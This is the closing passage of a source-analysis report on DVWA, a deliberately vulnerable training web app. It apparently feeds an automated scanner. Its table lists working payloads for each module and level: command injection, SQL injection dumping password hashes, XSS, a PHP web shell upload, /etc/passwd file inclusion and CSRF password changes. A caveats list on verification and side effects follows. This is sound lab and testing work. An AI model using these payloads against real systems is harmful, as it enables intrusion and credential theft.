| api | high | /vulnerabilities/api/v2/health/connectivity | POST | JSON `target` | `{"target":"127.0.0.1; false"}` / `; true` / `; sleep 3` / `; echo PWNED > /var/www/html/hackable/uploads/api_rce.txt` | 500 `Connection failed` vs 200 `OK`; latency; uploaded file 200 |
| api | impossible | /vulnerabilities/api/v2/login/login | POST | Basic auth + form `grant_type`,`username`,`password` | `grant_type=password&username=mrbennett&password=becareful` | 200 token; `GET /v2/order/1` + `Authorization: Bearer` → 200 orders (401 without) |
| authbypass | low | /vulnerabilities/authbypass/get_user_data.php | GET | – | – | 200 JSON array with `"user_id":1` |
| authbypass | medium | /vulnerabilities/authbypass/get_user_data.php | GET | – | – (page itself 403) | 200 JSON array (page 403 ≠ secure) |
| authbypass | high | /vulnerabilities/authbypass/change_user_details.php | POST | JSON `id`,`first_name`,`surname`; `Content-Type: application/json` | `{"id":1,"first_name":"Harry","surname":"Hacker"}` | `{"result":"ok"}` |
| authbypass | impossible | /vulnerabilities/authbypass/get_user_data.php (+change) | GET/POST | – | – | `{"result":"fail","error":"Access denied"}`; page 403 → not exploitable |
| bac | low | /vulnerabilities/bac/ | GET | `action`,`user_id` + cookie `user_id` | `action=View+Profile&user_id=2`, `Cookie: user_id=2` | `<h3>User Profile</h3>` + `Name: Gordon Brown` |
| bac | medium | /vulnerabilities/bac/ | GET | `action`,`user_id`,`token` | `action=View+Profile&user_id=2&token=user_token` | profile block |
| bac | high | /vulnerabilities/bac/ | GET | `action`,`user_id` | `action=View+Profile&user_id=2` as non-admin | `Access denied. You can only view your own profile.` → no bypass |
| bac | impossible | /vulnerabilities/bac/ | GET | `action`,`user_id` | same | `Access denied. Insufficient privileges.` → not exploitable |
| brute | low | /vulnerabilities/brute/ | GET | `username`,`password`,`Login` | `username=admin&password=password&Login=Login`; SQLi `username=admin'%23&password=x` | `Welcome to the password protected area` |
| brute | medium | /vulnerabilities/brute/ | GET | `username`,`password`,`Login` | same (+2 s delay per failure) | welcome marker |
| brute | high | /vulnerabilities/brute/ | GET | `username`,`password`,`Login`,`user_token` | admin/password + fresh token | welcome marker |
| brute | impossible | /vulnerabilities/brute/ | POST | `username`,`password`,`Login`,`user_token` | valid creds only once; 3 fails → 15 min lockout | `Welcome to the password protected area <em>admin</em>`; lockout text after 3 fails |
| captcha | low | /vulnerabilities/captcha/ | POST | `step`,`password_new`,`password_conf`,`Change` | `step=2&password_new=Pwn123&password_conf=Pwn123&Change=Change` | DB change; `<pre>Password Changed.</pre>` if keys set, else verify via csrf/test_credentials.php |
| captcha | medium | /vulnerabilities/captcha/ | POST | + `passed_captcha` | `step=2&passed_captcha=true&password_new=Pwn123&password_conf=Pwn123&Change=Change` | same |
| captcha | high | /vulnerabilities/captcha/ | POST | + `g-recaptcha-response`, header UA | `g-recaptcha-response=hidd3n_valu3&password_new=Pwn123&password_conf=Pwn123&Change=Change`, `User-Agent: reCAPTCHA` | `<pre>Password Changed.</pre>` (side effect if keys empty) |
| captcha | impossible | /vulnerabilities/captcha/ | POST | + `user_token`,`password_current`, real captcha | – | captcha/current-password error → not exploitable |
| cryptography | low | /vulnerabilities/cryptography/index.php | POST | `password` | `password=Olifant` | `<div class="success">Welcome back user</div>` |
| cryptography | medium | /vulnerabilities/cryptography/index.php | POST | `token` | `3061837c4f9debaf19d4539bfa0074c1174d4b2659239bbc50646e14a70becef837d1e6b16bfae07b776feb7afe57630caeb574f10f349ed839fbfd223903368873580b2e3e494ace1e9e8035f0e7e07` | `<div class="success">Welcome administrator Sweep</div>` |
| cryptography | high | /vulnerabilities/cryptography/source/check_token_high.php | POST | JSON `token`,`iv`; `Content-Type: application/json` | `{"token":"PhQwGVA3q+T2mT+L3Pe5Vg==","iv":"MTIzNDU2NzsxMjM0NTY3OA=="}` (IV[7]^=0x03) | `{"status":200,"user":"Geoffery","level":"admin"}` |
| cryptography | impossible | /vulnerabilities/cryptography/source/check_token_impossible.php | POST | JSON `token`,`iv` | tampered iv/token | `{"status":526,"message":"Unable to decrypt token"}` → not exploitable |
| csp | low | /vulnerabilities/csp/ | POST | `include` | `source/jsonp.php?callback=alert(1)//` (or allowed external alert.js) | response CSP = low policy + raw reflected `<script src='…'>`; JSONP GET returns `alert(1)//({"answer":"15"})`; browser alert |
| csp | medium | /vulnerabilities/csp/ | POST | `include` | `<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>` | raw script+nonce in body; browser alert |
| csp | high | /vulnerabilities/csp/ | POST | `include` | `<script src="source/jsonp.php?callback=alert(1)//"></script>` | raw tag in body; JSONP callback reflection; browser alert |
| csp | impossible | /vulnerabilities/csp/ | POST | `include` | same as high (designed-safe; residual-risk caveat §3.7) | `jsonp_impossible.php` = `solveSum ({"answer":"15"})`; browser should not alert → report not exploitable unless browser fires |
| csrf | low | /vulnerabilities/csrf/ | GET | `password_new`,`password_conf`,`Change` | `password_new=x&password_conf=x&Change=Change` | `<pre>Password Changed.</pre>` |
| csrf | medium | /vulnerabilities/csrf/ | GET | same + header `Referer` | + `Referer: {BASE}/vulnerabilities/csrf/` | `<pre>Password Changed.</pre>` |
| csrf | high | /vulnerabilities/csrf/ | GET or POST | HTML: `user_token`,`password_new`,`password_conf`,`Change` / JSON: header `user-token` + body | `/vulnerabilities/csrf/?user_token=<t>&password_new=x&password_conf=x&Change=Change` or JSON `{"password_new":"a","password_conf":"a","Change":1}` | `<pre>Password Changed.</pre>` / `{"Message":"Password Changed."}` |
| csrf | impossible | /vulnerabilities/csrf/ | GET | + `user_token`,`password_current` | – | `Passwords did not match or current password incorrect.` → not exploitable |
| exec | low | /vulnerabilities/exec/ | POST | `ip`,`Submit` | `127.0.0.1; id` | `uid=` inside `<pre>` |
| exec | medium | /vulnerabilities/exec/ | POST | `ip`,`Submit` | `127.0.0.1&#124;id` | `uid=` |
| exec | high | /vulnerabilities/exec/ | POST | `ip`,`Submit` | `127.0.0.1&#124;id` | `uid=` |
| exec | impossible | /vulnerabilities/exec/ | POST | `ip`,`Submit`,`user_token` | `127.0.0.1;id` | `ERROR: You have entered an invalid IP.` → not exploitable |
| fi | low | /vulnerabilities/fi/ | GET | `page` | `../../hackable/flags/fi.php` (also `/etc/passwd`, RFI if enabled) | `1.) Bond. James Bond` |
| fi | medium | /vulnerabilities/fi/ | GET | `page` | `....//....//....//....//....//etc/passwd` or `file:///etc/passwd` or `....//....//hackable/flags/fi.php` | `root:x:0:0` / `1.) Bond. James Bond` |
| fi | high | /vulnerabilities/fi/ | GET | `page` | `file:///etc/passwd` or `file4.php` or `file:///var/www/html/hackable/uploads/shell.jpg` | `root:x:0:0` / `File 4 (Hidden)` / `uid=` (upload chain) |
| fi | impossible | /vulnerabilities/fi/ | GET | `page` | `../../etc/passwd` / `file:///etc/passwd` | `ERROR: File not found!` → not exploitable |
| javascript | low | /vulnerabilities/javascript/ | POST | `phrase`,`token`,`send` | `phrase=success&token=38581812b435834ebf84ebcc2c6424d6&send=Submit` | `<p style='color:red'>Well done!</p>` |
| javascript | medium | /vulnerabilities/javascript/ | POST | `phrase`,`token`,`send` | `phrase=success&token=XXsseccusXX` | `Well done!` |
| javascript | high | /vulnerabilities/javascript/ | POST | `phrase`,`token`,`send` | `phrase=success&token=ec7ef8687050b6fe803867ea696734c67b541dfafb286a0b1239f42ac5b0aa84` | `Well done!` |
| javascript | impossible | /vulnerabilities/javascript/ | POST | – | – | page shows the "no impossible level" explanation; no `Well done!` → n/a |
| open_redirect | low | /vulnerabilities/open_redirect/source/low.php | GET | `redirect` | `https://digi.ninja` | 302 `Location: https://digi.ninja` |
| open_redirect | medium | /vulnerabilities/open_redirect/source/medium.php | GET | `redirect` | `//digi.ninja` | 302 `Location: //digi.ninja` |
| open_redirect | high | /vulnerabilities/open_redirect/source/high.php | GET | `redirect` | `https://digi.ninja/?a=info.php` | 302 `Location: https://digi.ninja/?a=info.php` |
| open_redirect | impossible | /vulnerabilities/open_redirect/source/impossible.php | GET | `redirect` | `1`/`2`/`99` only | fixed target map; non-numeric → 200 `Missing redirect target.` → not exploitable |
| sqli | low | /vulnerabilities/sqli/ | GET | `id`,`Submit` | `1' UNION SELECT user,password FROM users#` | `First name: admin` and MD5 `5f4dcc3b5aa765d61d8327deb882cf99` |
| sqli | medium | /vulnerabilities/sqli/ | POST | `id`,`Submit` | `1 UNION SELECT user,password FROM users#` | same |
| sqli | high | /vulnerabilities/sqli/session-input.php then /vulnerabilities/sqli/ | POST then GET | `id` (session), no token | `1' UNION SELECT user,password FROM users#` | same marker on the following GET |
| sqli | impossible | /vulnerabilities/sqli/ | GET | `id`,`Submit`,`user_token` | `id=1` valid; `id=1'…` rejected by `is_numeric` | `ID: 1` + `First name: admin`; injection empty output → not exploitable |
| sqli_blind | low | /vulnerabilities/sqli_blind/ | GET | `id`,`Submit` | true `1' AND '1'='1`; false `1' AND '1'='2` | exists → 200 + `User ID exists in the database.`; false → 404 + `…MISSING…` |
| sqli_blind | medium | /vulnerabilities/sqli_blind/ | POST | `id`,`Submit` | `1 AND 1=1` / `1 AND 1=2` | text `exists` vs `MISSING` (both 200) |
| sqli_blind | high | /vulnerabilities/sqli_blind/ (+cookie-input.php) | GET + cookie `id` | cookie `id` | `1' AND '1'='1` / `1' AND '1'='2` | text `exists` vs `MISSING` (both 200) |
| sqli_blind | impossible | /vulnerabilities/sqli_blind/ | GET | `id`,`Submit`,`user_token` | numeric only | no boolean differential → not exploitable |
| upload | low | /vulnerabilities/upload/ | POST multipart | `uploaded`,`Upload` | `shell.php` = `<?php system($_GET['cmd']); ?>`; then GET /hackable/uploads/shell.php?cmd=id | `succesfully uploaded!` then `uid=` |
| upload | medium | /vulnerabilities/upload/ | POST multipart | `uploaded` (part `Content-Type: image/jpeg`),`Upload` | `shell.php` php content, spoofed MIME; then GET uploaded | `succesfully uploaded!` then `uid=` |
| upload | high | /vulnerabilities/upload/ | POST multipart | `uploaded` = `shell.jpg` (valid JPEG + appended PHP),`Upload` | then integrate with FI high `page=file:///var/www/html/hackable/uploads/shell.jpg&cmd=id` | `succesfully uploaded!`; chain response `uid=` |
| upload | impossible | /vulnerabilities/upload/ | POST multipart | `uploaded`,`Upload`,`user_token` | PHP-as-image rejected / re-encoded random name | `Your image was not uploaded. We can only accept JPEG or PNG images.` or random-name link, no exec → not exploitable |
| weak_id | low | /vulnerabilities/weak_id/ | POST | – | empty POST | `Set-Cookie: dvwaSession=1` then `2`, `3` … |
| weak_id | medium | /vulnerabilities/weak_id/ | POST | – | empty POST | `Set-Cookie: dvwaSession=<current epoch seconds>` |
| weak_id | high | /vulnerabilities/weak_id/ | POST | – | empty POST | `Set-Cookie: dvwaSession=c4ca4238a0b923820dcc509a6f75849b` (md5("1")), then md5("2") … |
| weak_id | impossible | /vulnerabilities/weak_id/ | POST | – | empty POST | 40-hex random `dvwaSession`, Secure+HttpOnly → not predictable |
| xss_d | low | /vulnerabilities/xss_d/ | GET | `default` | `English<script>alert(1)</script>` (URL-encoded) | 200 (no server reflection); browser alert required |
| xss_d | medium | /vulnerabilities/xss_d/ | GET | `default` | `English>/option></select><img src='x' onerror='alert(1)'>` | 200 for payloads without `<script`; 302 `?default=English` for `<script` → filter bypass; browser alert |
| xss_d | high | /vulnerabilities/xss_d/ | GET | `default` | `English#<script>alert(1)</script>` (request carries only `default=English`) | 200; browser alert (fragment not server-visible) |
| xss_d | impossible | /vulnerabilities/xss_d/ | GET | `default` | – | 200 always; expected no browser alert → not exploitable (client-side only) |
| xss_r | low | /vulnerabilities/xss_r/ | GET | `name` | `<script>alert(1)</script>` | raw `<pre>Hello <script>alert(1)</script></pre>` |
| xss_r | medium | /vulnerabilities/xss_r/ | GET | `name` | `<SCRIPT>alert(1)</SCRIPT>` or `<img src=x onerror=alert(1)>` | raw payload in `<pre>` |
| xss_r | high | /vulnerabilities/xss_r/ | GET | `name` | `<img src=x onerror=alert(1)>` | raw payload in `<pre>` |
| xss_r | impossible | /vulnerabilities/xss_r/ | GET | `name`,`user_token` | `<script>alert(1)</script>` | payload HTML-encoded (`&lt;script&gt;`); no token → 302 → not exploitable |
| xss_s | low | /vulnerabilities/xss_s/ | POST | `txtName`,`mtxMessage`,`btnSign` | `txtName=<img src=x onerror=alert(1)>` | raw payload in guestbook (`<div id="guestbook_comments">`) |
| xss_s | medium | /vulnerabilities/xss_s/ | POST | `txtName`,`mtxMessage`,`btnSign` | name: `<img src=x onerror=alert(1)>` (message sanitized) | raw payload in guestbook |
| xss_s | high | /vulnerabilities/xss_s/ | POST | `txtName`,`mtxMessage`,`btnSign` | name: `<img src=x onerror=alert(1)>` | raw payload in guestbook |
| xss_s | impossible | /vulnerabilities/xss_s/ | POST | + `user_token` | `<img src=x onerror=alert(1)>` | encoded (`&lt;img`), no raw payload; missing token 302 → not exploitable |

**Coverage:** 19 modules × 4 levels = 76 rows; every module/level pair above has an explicit request, payload and marker (or an explicit "not exploitable / n/a" verdict with the reason and source references).

---

## 6. Coverage limits, assumptions and uncertainties (read before implementing)

1. **No live instance was used.** Everything is derived from `reference/dvwa` sources; HTTP status codes were derived from the PHP (e.g. `header()`/`http_response_code()` call sites), not observed. Validate against the real target once.
2. **Deployment assumptions:** base URL/port from `compose.yml` (127.0.0.1:4280) and docroot `/var/www/html` from `Dockerfile`. If the target is served from a subdirectory or different host/port, only the `{BASE}` prefix and the `/var/www/html` absolute paths in upload/FI chains change.
3. **`config/config.inc.php` is not in the tree** (only `.dist`). Values of `recaptcha_*`, `default_security_level`, `disable_authentication`, `SQLI_DB` are therefore deployment-dependent. `DEFAULT_SECURITY_LEVEL` defaults to `impossible`; `DISABLE_AUTHENTICATION` (if enabled) makes `checkToken` return true and `dvwaIsLoggedIn` true — the agent should detect this (no `login.php` redirect) and skip login.
4. **PHP version:** official image is `php:8-apache` (`Dockerfile` L1). The repo `php.ini` is not installed into PHP's config path, so PHP 8 defaults apply; `allow_url_include` is gone in PHP 8 → **RFI (FI low/medium) is not available on the stock image**, only LFI. `allow_url_fopen` default On. Confirm by checking `/vulnerabilities/fi/?page=include.php` for the warning "allow_url_include is not enabled".
5. **DOM XSS and CSP cannot be confirmed by HTTP alone** (xss_d all levels, csp low/medium/high). The report gives the server-side filter evidence; if the agent has no browser, mark these "potential — browser verification required" rather than confirmed.
6. **CSP impossible residual risk:** `impossible.php` still reflects `include` raw and CSP allows `'self'`, while `source/jsonp.php` (reflected callback) remains deployed. Static analysis cannot rule out a bypass; a browser test decides. Report as "designed secure, verify in browser; flag if alert fires".
7. **BAC help text mismatch:** `vulnerabilities/bac/help/help.php` describes a `user_id` cookie/`user_role` mechanism for medium/high, but the code (`source/medium.php` token, `source/high.php` `$_SESSION['user_id']`) is authoritative. High is **not** bypassable by HTTP request manipulation in this version; only session fixation/hijack (out of scope for a request-level scanner). Cite `source/high.php` L40-43 and L106-109.
8. **Cryptography high token is deterministic:** `token=PhQwGVA3q+T2mT+L3Pe5Vg==`, `iv=MTIzNDU2NzgxMjM0NTY3OA==` were derived by reproducing `openssl_encrypt('aes-128-cbc', 'rainbowclimbinghigh'→first 16 bytes, IV '1234567812345678', 'userid:2')`; the server-side source uses fixed KEY/IV (`token_library_high.php` L3-5, L37), so this is stable. The robust method is anyway: parse `token`/`iv` from the page's `<textarea>` (HTML-unescape), base64-decode the IV, `iv[7] ^= 0x03`.
9. **Token-format details worth knowing:** `user_token` = `md5(uniqid())` = 32 lowercase hex; CSRF-high header is `user-token` (lowercase in HTTP is normalised to `HTTP_USER_TOKEN`); cryptography high/impossible body JSON must have exact `Content-Type: application/json` (charset suffix would fail the `==` comparison at `check_token_high.php` L8, `csrf/source/high.php` L7).
10. **`user_token` uniqueness per page:** always read the token from the same response that precedes the POST; a second GET of the page invalidates it. Where a module needs a token (impossible levels, brute high, csrf high, etc.) the sequence is GET → parse → POST.
11. **Destructive side-effects to manage:** CSRF/CAPTCHA change the admin password; Stored-XSS injects into `guestbook`; uploads write `hackable/uploads/`; brute impossible + BAC impossible lock out / rate-limit. Provide a `setup.php` reset step between module groups.
12. **Version metadata:** README says 23.0.5 (`README.md` L161/L167); the local clone has no git tags (only branch `master`, HEAD `068d974`), so version-string checks in responses will not show 23.0.5 — do not assert on a version banner.
13. **Unverified interpretations are flagged in-line** where they occur: (a) the FI medium `hhttp://ttp://…` RFI bypass was verified only by emulating `str_replace` in Python, and is irrelevant on PHP 8; (b) `getimagesize` depends on the GD extension, which the Dockerfile installs; (c) the uploads directory writability is assumed (shipped as www-data-owned; `upload/index.php` L36 shows a warning if not writable).

---

*End of report. File: `notes/dvwa-source-analysis.md`; 19 modules × 4 levels = 76 cells; all source references relative to `reference/dvwa`.*
